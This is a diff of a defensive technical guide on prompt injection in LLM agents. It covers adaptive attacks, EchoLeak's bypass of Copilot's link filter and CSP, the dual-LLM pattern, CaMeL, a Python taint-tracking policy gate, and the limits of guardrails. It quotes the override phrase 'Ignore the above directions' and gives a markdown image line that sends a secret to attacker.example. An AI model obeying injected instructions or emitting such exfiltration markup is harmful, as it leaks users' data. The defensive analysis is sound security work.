@@ -12,7 +12,7 @@ In September 2022, Riley Goodside showed GPT-3 obeying "Ignore the above directi
 
 SQL injection was fixed by parameterized queries. The database receives code and data through separate, typed channels, so data can never run as code. An LLM has no such channel. It predicts the next token from one sequence (P1), and the system prompt, the user's message and a fetched web page are all tokens in that sequence (P2). Role labels such as `system` or `tool_result` are tokens too. Training teaches the model to weight them, but nothing enforces the boundary. And the untrusted text is exactly what the model must read to do its job.
 
-So no prompt fixes it. "Never follow instructions in documents" lowers the probability of obedience (P4), and Willison's answer to "lower" is that "in web application security 95% is very much a failing grade." In "The Attacker Moves Second" (Oct 2025), researchers from OpenAI, Anthropic and Google DeepMind ran adaptive attacks, which iterate against a defense, on 12 published defenses. Most fell at success rates above 90%, although most had "originally reported near-zero attack success rates." Security became an architecture problem: assume anything the model reads can steer it, and limit what a steered model can do. Actions happen only in code you control (P6), so that is where limits go.
+So no prompt fixes it. "Never follow instructions in documents" lowers the probability of obedience (P4), and Willison's answer to "lower" is that "in web application security 95% is very much a failing grade." In "The Attacker Moves Second" (Oct 2025), researchers from OpenAI, Anthropic and Google DeepMind ran adaptive attacks, which iterate against a defense, on 12 published defenses. Most fell with attack success rates above 90%, though the majority had "originally reported near-zero attack success rates." Security became an architecture problem: assume anything the model reads can steer it, and limit what a steered model can do. Actions happen only in code you control (P6), so that is where limits go.
 
 ## How it works (under the hood)
 
@@ -106,7 +106,7 @@ The layers run roughly from deterministic (enforced by code) to probabilistic (a
 - **Human approval for consequential actions,** a checker who isn't the maker (P8). Show the **full arguments**, because Invariant's tool-poisoning demo hid stolen data behind a simplified dialog. Keep approvals rare, or **approval fatigue** sets in and people click yes unread (OWASP ASI09).
 - **Egress controls.** A proxy that permits only listed destinations cuts the third leg whatever the model was told.
 - **Output handling.** Model output is untrusted input to its consumer (OWASP LLM05:2025). Never `eval` it or splice it into a shell, SQL or HTML. Watch for **markdown image exfiltration**: an injected model writes `![x](https://attacker.example/p.png?d=SECRET)`, the client renders it, and the browser's image fetch carries the secret out with no tool call at all. In **EchoLeak** (CVE-2025-32711, Microsoft 365 Copilot, fixed by Jun 2025), reference-style markdown slipped past the link filter, and an open redirect on an allow-listed Teams domain got past the Content Security Policy. Render images and links only from allow-listed domains, and strip URLs that carry data.
-- **The dual-LLM pattern and CaMeL.** Willison's **dual-LLM pattern** (Apr 2023) gives tools to a **privileged LLM** that sees only trusted input. A **quarantined LLM** with no tools reads untrusted content, and plain code stores its outputs as opaque variables (`$VAR1`) that the privileged model can route but never reads. **CaMeL** (Debenedetti et al., Google DeepMind and ETH Zurich, Mar 2025) found the flaw. If the quarantined model extracts "Bob's address" from a malicious document, the attacker picks the address. CaMeL's fix:
+- **The dual-LLM pattern and CaMeL.** Willison's **dual-LLM pattern** (Apr 2023) gives tools to a **privileged LLM** that sees only trusted input. A **quarantined LLM** with no tools reads untrusted content, and plain code stores its outputs as opaque variables (`$VAR1`) that the privileged model can route but never read. The **CaMeL** paper (Debenedetti et al., Google DeepMind and ETH Zurich, Mar 2025) identified a flaw. If the quarantined model extracts "Bob's address" from a malicious document, the attacker picks the address. CaMeL's fix:
   - The privileged LLM turns the trusted query into a restricted-Python program *before* any data is read, so data can't change control flow.
   - A custom interpreter runs it. The quarantined model only parses data into schema-checked values.
   - Every value carries **capabilities**, tags for its provenance and allowed readers.
@@ -117,7 +117,7 @@ The layers run roughly from deterministic (enforced by code) to probabilistic (a
 
 ### 5. A policy gate with taint tracking
 
-**Taint tracking** marks data from untrusted sources and follows the mark to whatever depends on it. This gate sits in the harness between the model's tool request and its execution:
+**Taint tracking** marks data from untrusted sources and follows the mark to whatever depends on it. The gate below sits in the harness between the model's tool request and its execution. It allow-lists tools by risk class, asks a human before destructive actions (and before writes once the session is tainted), and blocks external egress after untrusted content has entered the context:
 
 ```python
 from urllib.parse import urlparse
@@ -151,9 +151,9 @@ class PolicyGate:
                 return False, f"external egress blocked: context tainted by {self.tainted_by}"
             if not internal and not self.approve(tool, args):
                 return False, "human declined external send"
-        if risk in ("write", "destructive") and self.tainted_by:
+        if risk == "destructive" or (risk == "write" and self.tainted_by):
             if not self.approve(tool, args):           # show FULL args, not a summary
-                return False, "human declined action after untrusted input"
+                return False, f"human declined {risk} action"
         return True, "ok"
 
 gate = PolicyGate(approve=lambda tool, args: False)  # a cautious human, for the demo
@@ -173,7 +173,7 @@ The **OpenAI Agents SDK** builds in three kinds:
 - **Output guardrails** run only for the agent that produces the final output.
 - **Tool guardrails** run before and after each function-tool call; hosted tools such as web search bypass them.
 
-A failed check fires a **tripwire** exception that halts the run. Input guardrails run in parallel by default for latency, but then "the agent may have already consumed tokens and executed tools before being cancelled"; `run_in_parallel=False` blocks first. The Claude Messages API has no guardrail object, so the checks live in your harness. In Claude Code, a `PreToolUse` hook can block a call.
+A failed check fires a **tripwire** exception that halts the run. Input guardrails run in parallel by default for latency, but then "the agent may have already consumed tokens and executed tools before being cancelled"; `run_in_parallel=False` blocks first. The Claude Messages API has no hook for your own guardrails, so they live in your harness; its built-in safety classifiers enforce Anthropic's policy and surface as `stop_reason: "refusal"`. In Claude Code, a `PreToolUse` hook can block a call.
 
 Guardrails **catch** known patterns, PII formats, off-topic traffic and many jailbreaks. Anthropic's Constitutional Classifiers (Feb 2025) cut jailbreak success on 10,000 synthetic prompts from 86% to 4.4%, with 0.38% more refusals and 23.7% more compute. They **miss** novel and adaptive attacks, multi-turn attacks, and injections that don't look like injections: the EchoLeak email was written as a note to a human and evaded Microsoft's XPIA classifiers. A model-based guardrail can itself be injected. They **cost** a call each (P10), output checks fight streaming, and false positives block real users. Guardrails lower the *rate* of bad events. Architecture bounds the *damage*.
 
